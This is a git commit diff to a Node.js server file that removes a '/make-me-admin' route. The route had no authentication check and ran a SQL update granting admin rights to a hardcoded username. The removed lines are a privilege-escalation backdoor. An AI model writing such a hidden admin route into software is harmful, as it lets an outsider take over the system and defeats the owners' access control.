36e8eb62025ac3870733d2d45fcc89d80fb00e01
mr-d-nobody <mr-d-nobody@users.noreply.github.com>
2026-02-20 22:47:19 +0530

    define admin

--- sustainability-backend/server.js
+++ sustainability-backend/server.js
@@ -337,19 +337,7 @@ app.post("/admin/recharge",
     }
   }
 );
-app.get("/make-me-admin", async (req, res) => {
-  try {
-    await pool.query(
-      "UPDATE users SET role = 'admin' WHERE username = $1",
-      ["mrdnobody"]
-    );
-
-    res.send("You are now admin 👑");
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Error");
-  }
-});
+ 
 
 /* ================= START ================= */
 
